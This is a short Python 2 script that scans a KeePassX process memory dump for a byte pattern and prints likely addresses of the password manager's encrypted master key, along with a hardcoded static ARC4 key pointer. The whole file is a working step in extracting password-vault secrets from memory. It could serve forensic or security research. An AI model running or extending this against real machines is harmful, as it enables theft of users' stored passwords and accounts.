#!/usr/bin/python
import sys, re, struct

print 'KeepassX adr finder in dump'

if len(sys.argv) != 2:
    print "%s <procdump>" % sys.argv[0]

f = open(sys.argv[1], 'r')
data = f.read()
f.close()

guess_adr = None

print ' [*] Static ARC4 key pointer: 0x00552140'
print ' [*] Search for encrypted master key...'
print '*'*87
print ' start  -  end   |    adr1    |    adr2    |    match'
print '*'*87

for m in re.finditer(b"(.{4})\x20\x00{3}\x01.{3}(.{4})\x20\x00{3}\x01", data):
    if re.match(b"\x00{2}", m.group(1)):
        continue 

    adr1 = struct.unpack('<I', m.group(1))[0]
    adr2 = struct.unpack('<I', m.group(2))[0]
    
    if guess_adr == None:
        guess_adr = adr1
        
    print '%08x-%08x: 0x%08x | 0x%08x | %s' % (m.start(), m.end(), adr1, adr2, m.group(0).encode("hex"))

print '*'*87
print ' [*] Encrypted master key (guess): 0x%08x' % guess_adr
